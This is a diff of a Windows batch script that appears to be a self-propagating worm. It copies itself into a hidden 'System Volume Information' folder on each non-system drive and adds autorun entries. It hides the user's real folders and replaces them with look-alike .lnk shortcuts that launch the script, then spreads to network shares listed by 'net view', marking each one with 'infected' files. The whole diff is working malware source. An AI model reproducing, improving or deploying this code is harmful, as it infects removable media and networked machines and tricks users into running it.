@@ -116,31 +116,48 @@ for %%i in (localAppData appData) do (
 
 
 
-for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
-  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-    if /i "%%j" == "System Volume Information" (
-      if not exist "%%i:\%%j\%~nx0" copy /y "%~f0" "%%i:\%%j\"
-      attrib +h +s "%%i:\%%j"
-      %module_fileTouch% "%%i:\%%j\%~nx0" >nul
-      %autoRun% add %%i "%%i:\%%j\%~nx0"
+for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" (
+  if /i "%%i:" NEQ "D:" (
+    if not exist "%%i:\System Volume Information" md "%%i:\System Volume Information"
+
+    for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+      if /i "%%j" == "System Volume Information" (
+        if not exist "%%i:\%%j\%~nx0" copy /y "%~f0" "%%i:\%%j\"
+        attrib +h +s "%%i:\%%j"
+        %module_fileTouch% "%%i:\%%j\%~nx0" >nul
+        %autoRun% add %%i "%%i:\%%j\%~nx0"
+      )
+
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib +h +s "%%i:\%%j"
+        %module_fileTouch% "%%i:\%%j" >nul
+
+        if not exist "%%i:\%%j.lnk" (
+          set counter=0
+          for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
+          if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
+          ) else set icon=%WinDir%\System32\imageres.dll,153
+          if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
+          %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+          %module_fileTouch% "%%i:\%%j.lnk" >nul
+        )
+      )
     )
-
-    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
-      attrib +h +s "%%i:\%%j"
-      %module_fileTouch% "%%i:\%%j" >nul
-
-      if not exist "%%i:\%%j.lnk" (
-        set counter=0
-        for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
-        if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
-        ) else set icon=%WinDir%\System32\imageres.dll,153
-        if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
-        %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
-        %module_fileTouch% "%%i:\%%j.lnk" >nul
+  ) else (
+    echo.>"%%i:\System Volume Information\infected-%app_date%"
+    %module_fileTouch% "%%i:\System Volume Information\infected-%app_date%" >nul
+  
+    for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib -h -s "%%i:\%%j"
+        if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
       )
     )
   )
 ) else (
+  echo.>"%%i:\System Volume Information\infected-%app_date%"
+  %module_fileTouch% "%%i:\System Volume Information\infected-%app_date%" >nul
+
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
       attrib -h -s "%%i:\%%j"
@@ -156,7 +173,9 @@ timeout /nobreak /t 2 >nul
 
 
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
+    if not exist "%%h\%%i\System Volume Information" md "%%h\%%i\System Volume Information"
+
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" (
         if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~f0" "%%h\%%i\%%j\"
